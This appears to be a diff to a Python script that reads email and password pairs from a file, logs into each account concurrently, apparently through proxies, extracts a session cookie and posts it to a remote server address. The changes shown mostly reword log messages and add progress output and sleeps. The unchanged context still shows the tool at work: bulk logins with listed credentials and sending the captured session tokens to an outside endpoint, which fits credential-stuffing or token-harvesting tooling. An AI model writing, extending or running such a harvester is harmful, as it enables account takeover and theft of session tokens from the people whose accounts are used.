@@ -168,7 +168,7 @@ def login_once(email, password):
 def parse_emails_file(path=EMAILS_FILE):
     p = pathlib.Path(path)
     if not p.exists():
-        print(f"[ERROR] file not found: {path}"); sys.exit(1)
+        print(f"[ERROR] File not found: {path}"); sys.exit(1)
     pairs = []
     for ln in p.read_text(encoding="utf-8").splitlines():
         s = ln.strip()
@@ -179,7 +179,7 @@ def parse_emails_file(path=EMAILS_FILE):
         if email and password:
             pairs.append((email, password))
     if not pairs:
-        print("[ERROR] no valid credentials found"); sys.exit(1)
+        print("[ERROR] No valid credentials found"); sys.exit(1)
     return pairs
 
 def load_state():
@@ -224,12 +224,19 @@ def process_account(state, idx, thread_id=None):
     
     try:
         print(f"{thread_prefix} Processing {acc['email']}...")
+        time.sleep(1.0)  # Simular tiempo de procesamiento
+        print(f"{thread_prefix} Getting proxy and connecting...")
+        time.sleep(1.0)  # Simular tiempo de conexión
         c = login_once(acc["email"], acc["password"])
         if not c:
             raise RuntimeError("cookie_not_found")
         
         payload = {"cookies": {"j": c.get("value", "")}, "expirationDate": 999999999}
+        print(f"{thread_prefix} Sending result to server...")
+        time.sleep(1.0)  # Simular tiempo de envío
         requests.post(POST_URL, json=payload, timeout=10)
+        print(f"{thread_prefix} Result sent successfully!")
+        time.sleep(0.5)  # Tiempo final
         
         # Thread-safe result update
         with state_lock:
@@ -237,7 +244,7 @@ def process_account(state, idx, thread_id=None):
             acc["last_error"] = ""
             acc["result"] = {"domain": c.get("domain", ""), "value": c.get("value", "")}
         
-        print(f"{thread_prefix} [OK] {acc['email']}")
+        print(f"{thread_prefix} [SUCCESS] {acc['email']} - Token obtenido")
         
     except Exception as e:
         error_msg = f"{type(e).__name__}: {e}"
@@ -247,7 +254,7 @@ def process_account(state, idx, thread_id=None):
             acc["status"] = "error" 
             acc["last_error"] = error_msg
         
-        print(f"{thread_prefix} [ERR] {acc['email']} | {error_msg}")
+        print(f"{thread_prefix} [ERROR] {acc['email']} | {error_msg}")
         
     finally:
         save_state(state)
@@ -280,10 +287,11 @@ def main_concurrent(max_workers=5):
     ordered = [i for i in q if not (i in seen or seen.add(i))]
 
     if not ordered:
-        print("[DONE] nothing to process")
+        print("[DONE] Nothing to process")
         return
 
     print(f"[INFO] Processing {len(ordered)} accounts with {max_workers} concurrent workers")
+    print(f"[INFO] Progress: 0/{len(ordered)} (0%) - Starting...")
     
     # Process accounts concurrently
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
@@ -298,11 +306,17 @@ def main_concurrent(max_workers=5):
         for future in as_completed(future_to_idx):
             idx = future_to_idx[future]
             completed += 1
+            progress_percent = (completed / len(ordered)) * 100
+            print(f"[INFO] Progress: {completed}/{len(ordered)} ({progress_percent:.1f}%) - Account {idx} completed")
             try:
                 future.result()  # This will raise any exception that occurred
                 print(f"[INFO] Progress: {completed}/{len(ordered)} completed")
+                # Add small delay to allow WebSocket to send logs progressively
+                time.sleep(0.1)
             except Exception as e:
                 print(f"[ERROR] Thread processing account {idx} failed: {e}")
+                # Add small delay for error logs too
+                time.sleep(0.1)
 
     # Final state save and cursor update
     with state_lock:
@@ -321,7 +335,7 @@ def main():
     ordered = [i for i in q if not (i in seen or seen.add(i))]
 
     if not ordered:
-        print("[DONE] nothing to process")
+        print("[DONE] Nothing to process")
         return
 
     for idx in ordered:
@@ -330,7 +344,7 @@ def main():
     # Final state save and cursor update
     state["cursor"]["next_index"] = len(state["accounts"])
     save_state(state)
-    print("[DONE]")
+    print("[DONE] Sequential processing completed")
 
 if __name__ == "__main__":
     import argparse
